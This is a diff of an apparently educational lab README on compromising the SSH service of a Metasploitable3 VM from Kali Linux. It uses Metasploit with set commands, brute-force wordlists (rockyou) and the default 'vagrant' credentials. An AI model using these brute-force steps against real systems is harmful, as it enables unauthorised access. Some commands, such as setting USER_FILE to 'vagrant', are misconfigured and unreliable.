@@ -21,18 +21,17 @@ Both machines are connected using a **Bridged Network** configuration, allowing 
 - **Ping Attacker Machine From VIctim Machine:**
 <img src="Configuration_Screenshot/Ping_Metasploitable3_to_Kali.png" alt="Metasploitable3 IP Address" width="400"/>
 
-
-# Phase 1: Compromising Metasploitable3 SSH Service
-
-## 1.1 Using Metasploit Framework
-
-### Objective
-The objective of this task is to exploit a vulnerable SSH service running on Metasploitable3 (IP: `172.20.10.5`) using Kali Linux with Metasploit Framework.
-
 ### Setup Summary
 - **Attacker Machine:** Kali Linux on VMware (IP: `172.20.10.3`)
 - **Victim Machine:** Metasploitable3 (Linux) on UTM (IP: `172.20.10.5`)
 - **Network:** Bridged mode for both machines
+
+## Compromising Metasploitable3 SSH Service
+
+## 1.1 Using Metasploit Framework to compromise SSH
+
+### Objective
+The objective of this task is to exploit a vulnerable SSH service running on Metasploitable3 (IP: `172.20.10.5`) using Kali Linux with Metasploit Framework.
 
 ### Step-by-Step Process
 
@@ -51,21 +50,37 @@ The objective of this task is to exploit a vulnerable SSH service running on Met
    set RHOSTS 172.20.10.5
    ```
 
-4. Set known credentials (found through manual enumeration):
-   ```bash
-   set USERNAME vagrant
-   set PASSWORD vagrant
-   ```
-
-5. Enable verbose output to monitor the attempts:
+4. Enable verbose output to monitor the attempts:
    ```bash
    set VERBOSE true
    ```
+5. Assigning the credintitals can be accoplished in two main ways:
 
-6. Run the module:
+   - **Unkown Credentials** we will use kali built-in wordlists that will try all possible credentials using brute-force:
+   ```bash
+   set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+   set PASS_FILE /usr/share/wordlists/rockyou.txt
+   ```
+   <img src="Configuration_Screenshot/Trying_Burtforce.png" alt="Kali IP Address" width="400"/>
+   ** This step may take long time to find the right credintials
+
+   - **Known Credentials** use the known credintials directly which are **vagrant**:
+   ```bash
+   set USER_FILE vagrant
+   set PASS_FILE vagrant
+   ```
+   <img src="Configuration_Screenshot/Trying_Vagrant.png" alt="Kali IP Address" width="400"/>
+
+7. Run the module:
    ```bash
    run
    ```
+   - **Unknown Using Brute-Force**
+   <img src="Configuration_Screenshot/Trying_Burtforce.png" alt="Kali IP Address" width="400"/>
+
+   - **Known Credentials**
+   <img src="Configuration_Screenshot/Trying_Burtforce.png" alt="Kali IP Address" width="400"/>
+
 
 ### Result
 - The Metasploit module successfully authenticated using the username `vagrant` and password `vagrant`.
